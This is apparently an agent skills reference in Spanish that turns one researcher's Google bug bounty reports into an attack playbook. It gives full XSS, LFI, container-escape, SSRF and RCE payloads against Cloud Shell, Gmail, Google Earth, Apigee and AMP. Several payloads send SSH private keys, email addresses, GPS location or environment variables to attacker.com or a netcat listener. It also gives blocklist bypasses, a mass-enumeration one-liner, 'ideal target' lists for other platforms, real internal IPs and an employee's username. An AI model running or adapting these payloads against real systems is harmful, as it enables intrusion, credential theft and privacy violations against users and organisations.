---
name: Google Bug Hunters Skills
description: Skills and techniques derived from omespino's real bughunters.google.com reports. Chains, vectors, and methodologies that have produced confirmed findings against Google products.
type: reference
---

## Perfil de hallazgos (Google Bug Hunters / VRP)

- **Programas:** Google VRP (Google Cloud Shell)

---

## Skills confirmados

### 1. Google Cloud Shell instance takeover — Root via XSS + Path Traversal + Container Escape + SSH key exfiltration
**Target:** Google Cloud Shell | **PoC:** https://github.com/omespino/gcs_instace_takeover

**Cadena completa de ataque:**

#### Paso 1 — XSS sandboxed en preview de archivos .md
- Payload: `<style onload=alert(document.domain)>` en cualquier archivo `.md`
- El sandbox del preview es en realidad el editor Theia embebido con acceso completo a todos los archivos de la instancia

#### Paso 2 — LFI / Path Traversal via file:// URI en endpoint de archivos
- Endpoint vulnerable: `https://XXX-dot-XXXXXXXX-dot-devshell.appspot.com/files/?uri=file:///ruta`
- Permite leer cualquier archivo del sistema
- **Container escape:** usar `../` en el path escapa el root del contenedor y accede al filesystem del host

#### Paso 3 — Exfiltración de archivos críticos
- Leer `/etc/hosts` → obtener hostname de la VM
- Leer `../id_cloudshell` (fuera del contenedor) → obtener SSH private key de la instancia
- Enviar ambos archivos al servidor del atacante (ngrok + nc)

#### Paso 4 — Construcción del target SSH
- Hostname en `/etc/hosts`: `cs-6000-devshell-vm-XXXX-XXXX-XXXX-XXXX`
- Eliminar el prefijo `cs-6000-` y agregar `.cloudshell.dev`
- Resultado: `devshell-vm-XXXX-XXXX-XXXX-XXXX.cloudshell.dev`
- Reemplazar `\n` por saltos de línea en la private key y guardar como `id_cloudshell`

#### Paso 5 — Root SSH
```bash
ssh -i id_cloudshell -p 6000 root@devshell-vm-XXXX-XXXX-XXXX-XXXX.cloudshell.dev
# w00t — root en la VM de Google Cloud Shell
```

#### Vector de entrega (ataque a víctimas)
- El botón **"Open in Google Cloud Shell"** de GitHub ejecuta automáticamente el repositorio en la Cloud Shell de quien hace clic
- Subir el repo malicioso a GitHub → víctima hace clic → ataque se ejecuta en la Cloud Shell de la víctima → tomar control de su instancia como root

**Técnicas encadenadas:**
1. XSS en preview de Markdown (sandboxed Theia editor)
2. LFI via parámetro `uri=file:///` sin sanitizar
3. Container escape via path traversal `../`
4. Exfiltración de SSH private key
5. Acceso root por SSH al host subyacente

**Cadena técnica completa del XSS (detalle del PoC):**

**Trigger:** `<style onload="...">` en archivo `.md` previsualizando en Firefox con CSP deshabilitado

**Step 1 — XSS en preview de Markdown:**
```html
<style onload="{
  var container_url = 'https://' + location.host + '/files/?uri=/etc/ssh/keys/authorized_keys';
  fetch(container_url)
    .then(response => response.json()
      .then(data =>
        fetch('https://' + location.host + '/files/download/?id=' + data.id)
          .then(response => response.text()
            .then(content => document.write('authorized_keys:<br>' + content)))
      )
    )
}">
```

**Step 2 — API chain para leer archivos:**
```
GET /files/?uri=/etc/ssh/keys/authorized_keys  →  { "id": "xxxxx" }
GET /files/download/?id=xxxxx                  →  contenido del archivo
```

**Archivo objetivo:** `/etc/ssh/keys/authorized_keys` → leer claves autorizadas = posible RCE agregando clave del atacante

**Limitación documentada:** requiere Firefox con CSP deshabilitado — en Chrome el CSP lo bloquea

**Nota:** `191*7 = 1337` en el PoC — referencia l33t del autor

**Targets ideales para técnicas similares:**
- Cualquier plataforma con preview de archivos Markdown o HTML en sandbox
- Editores web (Theia, VS Code Web, Jupyter) con endpoints de lectura de archivos
- Entornos cloud shell / cloud IDE con acceso a filesystem
- Endpoints `?uri=`, `?path=`, `?file=` que acepten `file://` o rutas absolutas
- Buscar siempre `/etc/ssh/keys/authorized_keys` y `~/.ssh/authorized_keys` como objetivo de LFI → impacto RCE

---

### 20. XSS en Google Cloud Shell via SVG onload (Safari) + SSH private key exfiltration
**Target:** https://ssh.cloud.google.com/cloudshell/editor | **Browser:** Safari (macOS Catalina)

**Vector nuevo — SVG con onload en Safari:**
```xml
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg onload="alert(document.domain)" xmlns="http://www.w3.org/2000/svg"></svg>
```

**Comportamiento específico de Safari:**
- Safari bloquea third-party cookies → Cloud Shell abre el editor en una nueva ventana (`Open in a New Window`)
- Al cerrar esa segunda pestaña, el editor aparece en la primera → el XSS se ejecuta en ese contexto
- Si el usuario permite third-party cookies, el flujo es directo sin ventana adicional

**Payload completo — exfiltración de SSH private key (`id_cloudshell`):**
```xml
<svg onload="{
  var container_url = 'https://' + location.host + '/files/?uri=../id_cloudshell';
  fetch(container_url)
    .then(response => response.json()
      .then(data =>
        fetch('https://' + location.host + '/files/download/?id=' + data.id)
          .then(response => response.text()
            .then(key => alert(document.domain + '\n\n' + key)))
      )
    )
}" version="1.1" xmlns="http://www.w3.org/2000/svg"></svg>
```

**Path de la SSH private key:** `../id_cloudshell` — path relativo que escapa el container (mismo vector del reporte #1)

**Consolidado de vectores XSS en Google Cloud Shell:**
| Vector | Trigger | Browser | Archivo |
|---|---|---|---|
| `<style onload>` | Preview de .md | Firefox (CSP off) | xss.md |
| Filename `<img onerror>` en launch.json | Debug Console | Any | `<img onerror=alert(0)>.js` |
| SVG `onload` | Preview de .svg | Safari | alert.svg |
| `xlink:href` data URI | Click en elemento | Any | SVG con link |

**Path de SSH key consistente en todos los reportes de Cloud Shell:**
```
/files/?uri=../id_cloudshell           → obtiene ID del archivo
/files/download/?id=<id>              → descarga el contenido de la key
```

---

### 19. Gmail email address exfiltration via HTML attachment — Android content:// URI leak
**Target:** Gmail Android app + Chrome Android | **Versiones:** Gmail 2020.09.06, Chrome 85.0.4183.127

**Por qué funciona:**
- Gmail Android abre adjuntos HTML en Chrome via un Android content:// provider URI
- Ese URI contiene el email del usuario en el path: `content://com.google.android.gm.sapi/<email>/message_attachment_external/...`
- JavaScript dentro del HTML puede leer `document.location` → extrae el email del path

**Payload del adjunto HTML malicioso:**
```html
<script>
  // Extraer email del content:// URI → el email está en el índice [3] del path
  let email = document.location.toString().split('/')[3];
  document.write('<h2>Email: ' + email + '</h2>');
  alert(email);
  // Exfiltrar al servidor del atacante
  fetch("http://attacker.com/?victim_email=" + email);
</script>
```

**Content URI expuesto (formato):**
```
content://com.google.android.gm.sapi/<EMAIL>/message_attachment_external/<thread-id>/<msg-id>/0.1
                                       ↑
                                  email aquí en posición [3]
```

**Cadena de ataque:**
1. Atacante envía email con `gmail_exfil.html` como adjunto
2. Víctima abre el adjunto → Chrome Android lo carga con el content:// URI
3. JS extrae el email del path → `alert()` + `fetch()` al servidor del atacante
4. Atacante recibe el email en el query string: `?victim_email=victima@gmail.com`

**Técnica generalizada — Android content:// URI information disclosure:**
- Los content providers de Android (Gmail, Drive, Photos) usan URIs que pueden contener datos sensibles en el path
- Apps que pasan estos URIs a webviews o browsers externos pueden filtrar esa info a JS
- Buscar en otras apps Android que abran HTML/web content con `content://` URIs:
  - `document.location` → extrae datos del path
  - `document.referrer` → puede contener el URI original
- **Targets ideales:** apps de email, mensajería, gestores de documentos que abran adjuntos HTML en webview o browser externo

---

### 18. RCE como root en Apigee via Node.js Hosted Target — feature abuse
**Target:** apigee.com (Google Apigee API Management) | **Tipo:** Feature abuse → RCE

**Técnica:** Apigee permite desplegar "Hosted Targets" con código Node.js propio. El sandbox era insuficiente — el código corría como root con acceso al sistema host.

**Payload Node.js (index.js del proxy):**
```javascript
var http = require('http');
const { exec } = require('child_process');

var svr = http.createServer(function(req, resp) {
  resp.setHeader('Content-Type', 'application/json');
  exec('id; cat /etc/shadow', (error, stdout, stderr) => {
    resp.end('RCE output:\n\n' + stdout);
  });
});
svr.listen(process.env.PORT || 3000, function() {});
```

**Pasos para explotar:**
1. `Develop > API Proxies > +Proxy → Hosted Target → Quick Start`
2. Deploy en "prod"
3. `Edit proxy → Develop tab → Resources/hosted/index.js`
4. Reemplazar con payload → Save → visitar URL del proxy

**Confirmación de impacto:** `/etc/shadow` readable = proceso corriendo como root

**Patrón — feature abuse en plataformas de ejecución de código:**
- Buscar features de "hosted targets", "serverless functions", "custom scripts", "webhooks con código" en plataformas SaaS/PaaS
- Si permiten ejecutar código y el sandbox es inadecuado → escalada a RCE en el host
- Node.js `child_process.exec()` / Python `os.system()` / Ruby backticks para ejecutar comandos del sistema
- Confirmar root/impacto leyendo: `id`, `/etc/shadow`, `/etc/passwd`, `/proc/self/environ`

**Targets ideales con patrones similares:**
- Plataformas de API management con código custom (Apigee, Kong, AWS API Gateway con Lambda)
- Low-code/no-code con "code nodes" (n8n, Zapier Code, Make/Integromat)
- CI/CD con runners custom (GitHub Actions self-hosted, GitLab Runner, Jenkins)
- Plataformas de testing con scripts custom (Postman, Insomnia scripts)

---

### 17. XSS en Google Cloud Shell via filename injection en Debug Console (launch.json)
**Target:** https://ssh.cloud.google.com/cloudshell/editor | **Trigger:** debugger launch.json

**Vector nuevo — nombre de archivo como payload XSS:**
```bash
# Crear archivo con nombre malicioso
touch "<img src=0 onerror=alert(0)>.js"
```

**Inyección en launch.json del debugger:**
```json
{
  "configurations": [{
    "type": "node",
    "request": "launch",
    "name": "XSS Debug console",
    "program": "${workspaceFolder}/<img src=0 onerror=alert(0)>.js"
  }]
}
```

**Por qué funciona:**
- El Debug Console de Cloud Shell (Theia) renderiza el campo `program` de `launch.json` como HTML sin sanitizar
- El nombre del archivo contiene el payload → se inyecta en `launch.json` → el debugger lo renderiza → XSS ejecutado

**Comparativa de vectores XSS en Google Cloud Shell (mismo target, distintos vectores):**
| Vector | Trigger | Archivo |
|---|---|---|
| `<style onload>` en .md | Preview de Markdown | xss.md |
| Filename `<img onerror>` en launch.json | Debug Console | cualquier archivo |

**Generalización — filename injection como XSS:**
- IDEs web (Theia, VS Code Web, Cloud9, Jupyter) que rendericen nombres de archivo en HTML
- Exploradores de archivos en web apps que listen archivos sin sanitizar
- Cualquier interfaz que muestre el nombre de archivo en la UI: uploads, file managers, logs viewers
- **Payload filename de prueba:** `<img src=x onerror=alert(1)>.ext`
- **Otros vectores de filename:** `"><script>alert(1)</script>.txt`, `';alert(1)//`.js`

**Impacto en Cloud Shell:** XSS con acceso completo al filesystem de la instancia Linux (mismo impacto que reportes anteriores de Cloud Shell)

---

### 16. Blind SSRF oracle via Google Cloud Monitoring Uptime Check — 0.0.0.0 bypass
**Target:** https://console.cloud.google.com/monitoring/uptime | **Tipo:** SSRF + blind data exfiltration

**Bypass de localhost — `0.0.0.0` evade el blocklist:**
- El filtro bloquea: `127.*`, `169.*`, `10.*`, `172.*`, y IPs locales comunes
- `0.0.0.0` no está en el blocklist → el servidor lo resuelve como localhost → SSRF exitoso
- Confirmar: respuesta en 0ms = hit en localhost (red local instantánea)

**Configuración del uptime check para SSRF:**
```
Protocol: TCP
Hostname: 0.0.0.0
Port: 22
Response Content: "SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10"
Response timeout: 1s
```
- Si el contenido coincide → `"checkPassed": true`
- Si no coincide → `"contentMismatch": true`

**Exfiltración oracle carácter por carácter:**
El boolean response (checkPassed/contentMismatch) actúa como oráculo de 1 bit:
```
"SSH"     → checkPassed: true   ✓
"SSH-"    → checkPassed: true   ✓
"SSH-2"   → checkPassed: true   ✓
"SSH-2.0" → checkPassed: true   ✓
"SSH-2.1" → contentMismatch: true  ✗
```
Automatizable: brute force carácter a carácter sobre el charset `[0-9A-Za-z._-]` reconstruye el banner completo

**Algoritmo de exfiltración automatizable:**
```python
import requests

charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.-_ "
known = "SSH"

while True:
    for c in charset:
        # hacer uptime check con content = known + c
        # si checkPassed: true → known += c; break
        # si contentMismatch: true → continuar
        pass
```

**Bypass de `0.0.0.0` para SSRF — variantes documentadas:**
| Bypass | Bloquea |
|---|---|
| `0.0.0.0` | Generalmente no filtrado → resuelve a localhost |
| `0177.0.0.1` | Octal de 127.0.0.1 |
| `2130706433` | Decimal de 127.0.0.1 |
| `::1` | IPv6 localhost |
| `[::]` | IPv6 any address |
| `http://①②⑦.①.①.①` | Unicode bypass |

**Targets ideales para este patrón:**
- Cualquier servicio de "uptime check" / "health check" / "webhook test" que haga requests server-side
- Validadores de URL, importadores de feeds, generadores de thumbnails
- El oracle no necesita ser boolean — cualquier diferencia observable en la respuesta sirve (tiempo, tamaño, código HTTP)

---

**Extensión del reporte anterior — SSRF via redirect chain + `[::169.254.169.254]` → GCP metadata**

**Bypass con redirect en servidor propio:**
```php
<?php
// 302.php — hosted en servidor del atacante
$location = 'http://[::169.254.169.254]'; // formato IPv6 compatible con IPv4 — bypasses el filtro
$path = '/computeMetadata/v1/project/project-id';
header('Location: ' . $location . $path, TRUE, 302);
?>
```

**Configuración del uptime check con redirect chain:**
```
Protocol: HTTP
Hostname: omespino.com (servidor propio con 302.php)
Path: /302.php
Custom Headers: Metadata-Flavor: Google   ← requerido para endpoints /v1/ de GCP metadata
```

**Por qué funciona `[::169.254.169.254]`:**
- El filtro bloquea `169.254.169.254` literalmente pero no su forma IPv6-compatible
- `[::169.254.169.254]` es IPv4-mapped IPv6 address — representa la misma IP a nivel de red
- El uptime checker sigue el redirect y llega al metadata endpoint de GCP

**Diferencia entre los dos bypasses del reporte anterior:**
| Bypass | Target | Protocolo |
|---|---|---|
| `0.0.0.0` | localhost (SSH port 22) | TCP |
| redirect + `[::169.254.169.254]` | GCP metadata endpoint | HTTP |

**Datos exfiltrables de GCP metadata via oracle:**
- `project/project-id` → nombre del proyecto GCP
- `project/numericProjectId` → ID numérico
- Cualquier endpoint de `/computeMetadata/v1/` accesible con `Metadata-Flavor: Google`

**Header forwarding en uptime checks:**
- Google Cloud Monitoring permite agregar custom headers → se reenvían al server destino
- Usar para pasar `Metadata-Flavor: Google`, `Authorization`, u otros headers requeridos por el target interno

---

### 15. No rate limit + IDOR sequential — mass enumeration de Android TV device IDs
**Target:** `https://www.android.com/tv/setup/lookup?dc={}` | **Tipo:** Missing rate limit + IDOR

**Técnica:** el parámetro `dc` es un código numérico secuencial predecible — sin rate limit, permite enumerar masivamente device names e IDs reales

**One-liner de explotación:**
```bash
time seq -w 0 009999 | xargs -I {} -P20 curl -s \
  "https://www.android.com/tv/setup/lookup?dc={}" \
  | tr '&' '\n' | grep device | tee android_tvs_scrapped.txt
```
- `-P20` → 20 requests en paralelo
- `seq -w 0 009999` → padding con ceros, números del 0000 al 9999
- `tr '&' '\n' | grep device` → parsea los campos `device_id`, `device_name`, `device_type` de la respuesta
- **Resultado:** ~900 dispositivos en ~3 minutos (9% hit rate)

**Escalabilidad del ataque:**
| Requests | Dispositivos estimados | Tiempo aprox |
|---|---|---|
| 10,000 | ~900 | 3 min |
| 100,000 | ~9,000 | 30 min |
| 1,000,000 | ~90,000 | ~5 hrs |

**Metodología generalizada — enumeration sin rate limit:**
1. Identificar endpoints con parámetros numéricos/secuenciales (`id=`, `dc=`, `code=`, `token=`)
2. Verificar ausencia de rate limit con burst de requests
3. Automatizar con `seq + xargs -P` (paralelo) o `ffuf -w wordlist`
4. Parsear respuestas para extraer campos de valor

**Indicadores de endpoints enumerables:**
- Parámetros de un solo campo numérico en URLs de setup/lookup
- Respuestas que varían entre "found" y "not found" sin bloquear
- Códigos con padding de ceros (`0001`, `0002`...) → rango finito y predecible

**Targets ideales:** Endpoints de activación/setup de dispositivos IoT, códigos de invitación, IDs de sesión cortos, códigos de pairing de dispositivos

---

### 14. Arbitrary file read via null byte (%00) en Google Earth Pro macOS — desde la UI
**Target:** Google Earth Pro Desktop 7.3.3.7786 (macOS) | **Tipo:** File Inclusion via null byte bypass

**Técnica completamente diferente a los reportes KML — vector desde la UI de la app:**
- No requiere archivo KML externo — el vector es el campo "Add Link" al crear un Pin en la propia UI de Google Earth
- **Payload:** `<a href="file:///etc/passwd%00.html">passwd</a>`

**Por qué funciona el null byte:**
- El `%00` (null byte) termina el string a nivel de OS — el sistema operativo lee `/etc/passwd` y para ahí
- La extensión `.html` después del null byte nunca llega al filesystem — es solo para engañar al filtro de la app
- La app verifica la extensión (`.html`) y la acepta, pero el OS abre el archivo real (`/etc/passwd`)
- **Esta técnica funcionaba en macOS** porque el path parsing era vulnerable a null byte injection

**Pasos de explotación (desde la UI):**
1. Abrir Google Earth Pro → crear nuevo Pin
2. En el campo "Add Link" pegar: `<a href="file:///etc/passwd%00.html">texto</a>`
3. Hacer clic en el hipervínculo en el panel izquierdo "Places"
4. El contenido de `/etc/passwd` se muestra directamente

**Generalización — null byte bypass en file:// URIs:**
```
file:///etc/passwd%00.html
file:///etc/shadow%00.jpg
file:///home/user/.ssh/id_rsa%00.png
file:///Users/user/Library/Keychains/login.keychain%00.html  # macOS
```

**Aplicaciones en otros contextos:**
- Cualquier app desktop que filtre extensiones en file:// URIs pero sea vulnerable a null byte
- Parámetros de inclusión de archivos en apps legacy (PHP, Java antiguo): `?file=config.php%00.txt`
- Navegadores y viewers de documentos con rendering de file:// sin sanitización de null bytes

**Diferencia entre vectores de Google Earth (consolidado):**
| Reporte | Plataforma | Vector | Técnica |
|---|---|---|---|
| KML CDATA + script src | Desktop Linux | Archivo KML externo | LFI path traversal relativo |
| KML CDATA + onerror | iOS | Archivo KML via Drive | XSS + geolocation |
| Pin "Add Link" + %00 | Desktop macOS | UI nativa de la app | Null byte bypass en file:// |

---

### 13. XSS en Google Earth iOS app via KML — exfiltración de geolocalización precisa
**Target:** Google Earth iOS App v9.134.0 | **Entrega:** Google Drive link → "Open with Google Earth"

**Diferencias clave vs Google Earth Pro desktop (reporte #11):**
- Plataforma: **iOS** (no desktop Linux)
- Trigger XSS: `onerror` en `<img>` con src roto en lugar de `<script src="file://...">`
- Impacto: exfiltración de **coordenadas GPS precisas** (latitud/longitud) via `navigator.geolocation`
- Delivery: KML compartido via Google Drive → víctima abre en Google Earth iOS

**Payload KML (CDATA con onerror):**
```xml
<description><![CDATA[
  <img onerror='{
    navigator.geolocation.getCurrentPosition(function(position) {
      document.write("Lat: " + position.coords.latitude + " Lon: " + position.coords.longitude);
      document.write("<img src=http://attacker.com/?" + position.coords.latitude + "," + position.coords.longitude + ">");
    });
  }' src="./2.htm">
]]></description>
```

**Por qué funciona `onerror` aquí:**
- `src="./2.htm"` es una ruta relativa que no existe → el browser embebido dispara `onerror`
- El handler `onerror` ejecuta JS arbitrario en el contexto del KML
- En apps de mapas, el usuario ya espera un prompt de ubicación → acepta sin sospechar

**Cadena de ataque completa:**
1. Attacker crea KML malicioso y lo sube a Google Drive
2. Comparte el link con la víctima
3. Víctima hace clic en Drive → "Open with Google Earth"
4. KML carga, víctima hace clic en el marcador
5. App pide permiso de ubicación (comportamiento esperado en app de mapas — víctima acepta)
6. XSS se dispara, obtiene GPS preciso, exfiltra al servidor del atacante

**Diferencias de trigger XSS en KML (consolidado):**
| Técnica | Evento | Requiere interacción |
|---|---|---|
| `<script src="file:///etc/environment">` | automático al cargar | No |
| `<img onerror='...' src="./broken">` | automático (src roto) | No |
| hipervínculo `javascript:prompt()` en .doc/.ppt | clic del usuario | Sí |
| `<svg onload='...'>` | automático al renderizar | No |

**Targets ideales para geolocation exfiltration:**
- Apps móviles que rendericen HTML/KML/SVG con browser embebido (mapas, navegación, turismo)
- Apps que ya tienen permisos de ubicación activos → no piden confirmación adicional
- `navigator.geolocation` funciona en cualquier webview con permisos de ubicación concedidos

---

### 12. Mobile Harness Lab Server LFI como root — $3,133.70 reward (100.x.x.x range, port 9999)
**Target:** 100.8.125.10:9999 | **Reward:** $3,133.70 | **Accepted:** Aug 12, 2021 | **Sistema:** Mobile Harness Lab

**Elementos nuevos vs reportes anteriores:**

**IP en rango 100.x.x.x (CGNAT/privado) expuesta públicamente:**
- Las IPs 100.64.0.0/10 son normalmente privadas (CGNAT RFC 6598)
- Encontrar servicios en este rango accesibles desde internet es inusual y alto valor
- Indica que Google tenía una ruta de red mal configurada hacia estas IPs

**Confirmación de root via /proc/self/environ:**
- `SUDO_GID=0` y `SUDO_USER=root` en el output de `/procz?file=/proc/self/environ`
- Estos campos en environ son confirmación directa de proceso corriendo con privilegios de root via sudo
- **Indicador clave:** buscar `SUDO_GID`, `SUDO_USER`, `USER=root`, `UID=0` en el output del environ

**Nueva confirmación de /varz con datos prod:**
```
/varz → built-at search-build-search-infra@otci17.prod.google.com:/google/src/cloud/buildrabbit-username/buildrabbit-client/google3
```
- Expone username interno del build system (`buildrabbit-username`) y hostname prod

**Enlace g3doc:// en /statusz:**
- `g3doc://java/com/google/wireless/qa/mobileharness/lab:lab_server_deploy.jar`
- Los links `g3doc://` en /statusz apuntan a documentación interna de Google — confirman que el servicio es legítimamente interno
- Redirigen a login en **MOMA** (Google's internal SSO) si se acceden desde fuera de corp network

**"Not hosted on Borg" en /statusz:**
- Indica que el servicio corre fuera del sistema de orquestación principal de Google
- Estos servicios suelen tener menos supervisión de seguridad → más probable que tengan endpoints de debug expuestos

**Reward reference para calibrar severidad:**
- $3,133.70 por LFI + internal dashboard exposure sin RCE directo
- El patrón `/labelaclz` + `/procz?file=` + `/flagz` en IPs públicas de Google ASN vale en el rango de $1,000–$5,000+ según el sistema expuesto

---

### 11. XSS + LFI en Google Earth Pro via KML — /etc/environment disclosure con path traversal relativo
**Target:** Google Earth Pro Desktop 7.3.4.8284 (Linux) | **Sistema:** Ubuntu 20.04

**Por qué es diferente al reporte de Chrome:**
- Vector: archivo **KML** (formato propietario de Google Earth) en lugar de HTML
- El browser embebido de Google Earth Pro permite `file://` con **path traversal relativo** desde la ubicación del KML
- La sección `<description><![CDATA[...]]>` de KML renderiza HTML/JS completo — XSS en app de escritorio

**Payload KML malicioso:**
```xml
<Placemark>
  <name>placemark</name>
  <description><![CDATA[
    <script src="file:../../../../../../../etc/environment"></script>
    <script>
      document.write('PATH var = ' + PATH);
      document.write('JAVA_HOME var = ' + JAVA_HOME);
      document.write('<img src="http://attacker.com/?path=' + PATH + '&java_home=' + JAVA_HOME + '">');
    </script>
  ]]></description>
</Placemark>
```

**Diferencia técnica clave — path traversal relativo:**
- Chrome usaba ruta absoluta: `file:///etc/environment`
- Google Earth usa ruta relativa: `file:../../../../../../../etc/environment`
- El traversal parte desde la ubicación del archivo KML → permite leer archivos fuera del directorio del KML

**Flujo de ataque:**
1. Víctima descarga/recibe el `.kml` malicioso
2. Doble clic → Google Earth Pro lo abre automáticamente
3. Víctima hace clic en el marcador (placemark) → se renderiza la descripción
4. El XSS se dispara, carga `/etc/environment`, exfiltra variables al servidor del atacante

**Generalización — XSS en apps de escritorio via formatos de archivo:**
- KML → Google Earth Pro
- Buscar otros formatos que rendericen HTML en apps de escritorio: `.gpx`, `.svg`, archivos de mapas, documentos enriquecidos
- Apps de escritorio con browsers embebidos (Electron, WebKit, CEF) suelen tener acceso a `file://` sin las restricciones de un browser moderno
- **Indicador:** si una app de escritorio muestra contenido HTML (descripciones, tooltips, paneles) → probar inyección via el formato de archivo que consume

---

### 10. Local file read via Chrome — /etc/environment como JavaScript válido
**Target:** Google Chrome 92.0.4515.159 (Linux) | **Status:** Duplicate | **OS:** Ubuntu 20.04

**Técnica:** `/etc/environment` tiene formato compatible con JavaScript (`VAR="value"`) — Chrome puede cargarlo como script desde file:// y las variables quedan accesibles en el scope global

**Payload HTML malicioso:**
```html
<!-- Cargar /etc/environment como script JS -->
<script src="file:///etc/environment"></script>

<!-- Exfiltrar variables conocidas al servidor del atacante -->
<img src="http://attacker.com/?path=" + PATH>
<img src="http://attacker.com/?java=" + JAVA_HOME>
```

**Por qué funciona:**
- `/etc/environment` contiene líneas como `PATH="/usr/local/bin:/usr/bin"` — sintaxis idéntica a declaración de variable JS
- Chrome en modo `file://` permite cargar otros archivos locales como scripts
- Las variables del archivo quedan en el scope global y pueden ser leídas y exfiltradas

**Variantes de archivos locales cargables como script:**
- `/etc/environment` — variables de entorno del sistema
- Cualquier archivo con formato `KEY="value"` o `KEY=value` — sintaxis JS válida
- Brute force de nombres de variables comunes (`PATH`, `JAVA_HOME`, `HOME`, `USER`, etc.)

**Requisito:** la víctima debe abrir el HTML malicioso localmente en Chrome (vector de entrega: phishing, USB drop, adjunto de email)

**Exfiltración via netcat:**
```bash
sudo nc -l -p 80  # escuchar en el servidor atacante
# Chrome enviará las variables en el query string del IMG tag
```

**Aplicaciones más amplias de la técnica:**
- Buscar otros archivos de config Linux con formato JS-compatible: `.bashrc`, `/etc/profile`, archivos de configuración de apps
- Aplicable a otros browsers que permitan `file://` cross-file loading

---

### 9. SSRF en AMP Validator → GCP metadata exposure (169.254.169.254)
**Target:** https://validator.ampproject.org/ | **Closed:** Oct 27, 2021 | **Colaboración:** con Sreeram KL

**Vector:** El validador de AMP hace fetch de la URL que le pasas para validarla — cualquier URL incluyendo IPs internas
**Payload:**
```
http://169.254.169.254/?recursive=true&alt=text
```

**Datos expuestos desde el metadata endpoint de GCP:**
- `instance/id` — ID de la instancia
- `instance/region` — región GCP
- `instance/zone` — zona GCP
- `project/numericProjectId` — ID numérico del proyecto GCP
- `project/projectId` — nombre del proyecto GCP
- `instance/serviceAccounts/email` — email de la service account
- `instance/serviceAccounts/scopes` — permisos OAuth de la service account

**Parámetros clave del endpoint de GCP metadata:**
- `?recursive=true` → devuelve TODOS los metadatos en árbol
- `&alt=text` → formato texto plano en lugar de JSON
- Header alternativo para algunos endpoints: `Metadata-Flavor: Google`

**Indicador de load balancer:** respuestas con diferentes `instance/id` en cada request → múltiples instancias GCP detrás del servicio

**Clase de targets para SSRF → GCP metadata:**
- Validadores de URL (AMP, OpenGraph, Schema.org)
- Previsualizadores de links (Slack, Discord, herramientas internas)
- Servicios de webhook que hacen GET/POST a URLs configurables
- Import/embed de URLs externas (feeds RSS, iframes, imágenes por URL)
- Cualquier servicio que corra en GCP/AWS/Azure y fetche URLs del usuario

**Payloads completos por proveedor cloud:**
```
# GCP
http://169.254.169.254/?recursive=true&alt=text
http://metadata.google.internal/computeMetadata/v1/?recursive=true  (+ header Metadata-Flavor: Google)

# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01  (+ header Metadata: true)
```

---

### 8. Googler personal dev machine expuesta — UPI India payment gateway + LFI como root (HTTPS/443)
**Target:** 34.120.121.40:443 (HTTPS) | **Fixed:** Aug 19, 2022 | **Sistema:** UPI India Payment Gateway sync service

**Elementos únicos vs reportes anteriores:**

**Máquina de desarrollo personal de Googler expuesta públicamente:**
- `/statusz` revela: `Built on rathivivek@linuxcloudtop1.c.googlers.com:/google/src/cloud/rathivivek/...`
- Identifica al Googler propietario (`rathivivek`) y su cloud workstation personal
- Build path interno: `//cloud/api_products/payment_gateway/upi_india/issuer_switch/sync_service`
- **Sistema crítico:** infraestructura del sistema de pagos UPI de India

**Via /streamz — confirmación de root y contexto Kubernetes:**
```
binary_name: service
hostname:    sync-service-7d4965ddb9-rh7tq   ← pod de Kubernetes
unix_user:   root
```
- El hostname con formato `<name>-<replicaset>-<pod-id>` es indicador de Kubernetes — el servicio corre en un pod k8s expuesto

**Nuevo endpoint: `/reportcardz`**
- `https://34.120.121.40/reportcardz` — expone reportes internos del servicio sin autenticación

**LFI via HTTPS (puerto 443):**
```
https://34.120.121.40/procz?file=/proc/self/environ
https://34.120.121.40/procz?file=/proc/self/maps
https://34.120.121.40/procz?file=/proc/cpuinfo
```

**Técnica adicional — identificar al propietario via /statusz:**
- `Built on <user>@<machine>` en `/statusz` expone el username del Googler y el nombre de su workstation
- Útil para correlacionar con repositorios públicos de GitHub del empleado
- `Built as <path>` expone la ruta interna del proyecto en Google3 (monorepo interno de Google)

**Indicadores de Kubernetes en los endpoints de debug:**
- `hostname` con formato `<service>-<hash>-<pod>` → pod k8s
- `global_pid` negativo → posible indicador de namespace de PID de container
- Buscar estos patrones en `/streamz` para identificar si el target corre en k8s

---

### 7. Internal Google Mobile Harness dashboard expuesto + LFI — /streamz endpoint (2026)
**Target:** 108.177.0.8:9999 | **Aceptado:** May 6, 2026 | **Sistema:** Google Mobile Harness (device testing infra)

**Nuevo endpoint descubierto: `/streamz`**
- `/streamz` es el sistema de métricas interno de Google (diferente a `/flagz`)
- Expone árbol de métricas internas sin autenticación: `/build/`, `/grpc/`, `/net/`, `/proc/`, `/rpc/`, `/security/`, etc.
- Datos sensibles visibles en `/streamz#`:
  ```
  binary_name: com.google.devtools.mobileharness.infra.lab.LabServerLauncher
  global_pid:  2547180562544291379
  hostname:    192.168.95.1   ← IP interna
  unix_user:   g00gl3          ← cuenta de servicio interna de Google
  ```
- Sistemas internos expuestos en el árbol: Chubby (lock service), Monarch (métricas), Fireaxe, privacy/ddt

**LFI via /procz (mismo patrón confirmado en nuevo sistema):**
```
http://108.177.0.8:9999/procz?file=/proc/cpuinfo
http://108.177.0.8:9999/procz?file=/proc/self/environ
http://108.177.0.8:9999/procz?file=/proc/self/maps
```

**Inventario completo de endpoints de debug de Google (consolidado de todos los reportes):**
| Endpoint | Información expuesta |
|---|---|
| `/labelaclz` | Owner, policy (OPEN/OWNER_ONLY), confirma si corre como root |
| `/flagz` | Config flags, API keys internas, URLs de servicios corp |
| `/procz?file=` | **LFI** — lee archivos arbitrarios del sistema |
| `/statusz` | Estado del servidor, memoria, build label, BNS address, changelist |
| `/streamz` | Árbol de métricas internas, binary name, hostname interno, unix_user |
| `/varz` | Variables internas del proceso |
| `/java/statusz` | Variante Java del statusz (springboard.google.com) |
| `/java/procz` | Variante Java del LFI |
| `/java/labelaclz` | Variante Java del labelaclz |
| `/reportcardz` | Reportes internos del servicio (descubierto en 34.120.121.40) |

**Puertos observados en hallazgos reales:**
- `80` — 34.94.39.119, 35.227.157.158
